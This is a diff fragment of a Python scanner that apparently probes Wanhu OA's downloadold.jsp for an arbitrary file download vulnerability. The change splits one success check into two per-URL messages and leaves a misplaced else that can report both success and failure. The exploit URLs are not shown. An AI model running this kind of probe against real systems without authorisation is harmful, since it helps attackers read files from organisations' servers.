@@ -27,8 +27,10 @@ def main(target_url):
         respones1 = requests.get(exp_url1, headers=headers, verify=False)
         respones2 = requests.get(exp_url2, headers=headers, verify=False)
         
-        if respones1.status_code == 200 or respones2.status_code == 200:
-            console.print(now_time() + ' [SUCCESS]  万户OA downloadold.jsp 任意文件下载漏洞存在{}'.format(vuln), style='bold green')
+        if respones1.status_code == 200:
+            console.print(now_time() + ' [SUCCESS]  万户OA downloadold.jsp 任意文件下载漏洞存在{}'.format(exp_url1), style='bold green')
+        if respones2.status_code == 200:
+            console.print(now_time() + ' [SUCCESS]  万户OA downloadold.jsp 任意文件下载漏洞存在{}'.format(exp_url2), style='bold green')
         else:
             console.print(now_time() + ' [WARNING]  万户OA downloadold.jsp 任意文件下载漏洞不存在', style='bold red ')
     except:
